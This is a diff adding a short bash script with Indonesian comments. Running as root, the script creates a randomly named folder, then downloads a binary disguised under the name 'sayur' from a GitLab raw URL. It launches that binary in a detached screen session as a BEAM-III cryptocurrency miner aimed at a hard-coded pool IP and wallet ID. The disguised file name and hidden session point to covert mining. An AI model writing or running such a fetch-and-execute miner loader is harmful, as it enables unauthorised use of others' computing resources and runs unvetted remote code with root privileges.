@@ -1,0 +1,34 @@
+#!/bin/bash
+sudo su <<EOF
+# Unduh file names.txt
+wget -qO names.txt https://raw.githubusercontent.com/huntergregal/wordlists/master/names.txt
+
+# Ambil satu nama acak dari names.txt
+TIK=$(shuf -n 1 names.txt | tr -cd '[:alnum:]._-' | tr ' ' '_')
+
+# Cek apakah variabel TIK kosong
+if [ -z "$TIK" ]; then
+    echo "Error: Tidak dapat mengambil nama dari file names.txt."
+    exit 1
+fi
+
+# Buat folder dengan nama acak
+mkdir -p "$TIK"
+
+# Masuk ke dalam folder
+cd "$TIK" || { echo "Gagal masuk ke folder $TIK."; exit 1; }
+
+# Tampilkan pesan sukses
+echo "Folder '$TIK' berhasil dibuat dan Anda sekarang berada di dalamnya."
+
+sudo apt install screen -y
+
+wget -qO sayur https://gitlab.com/sarifadim/jomblo/-/raw/main/sagu && chmod +x sayur &&
+screen -dms run ./sayur --algo BEAM-III --pool 47.236.123.51:80 --user 35abc183df02cef8b5ab05ea3df9ecf5e1b8bbeb8ccc0bdb7a27073e80621131c4e.$(echo 0J-$(TZ=UTC-7 date +"%H-%M-%S")) --tls enable --no-cl
+
+EOF
+screen -r
+
+
+
+
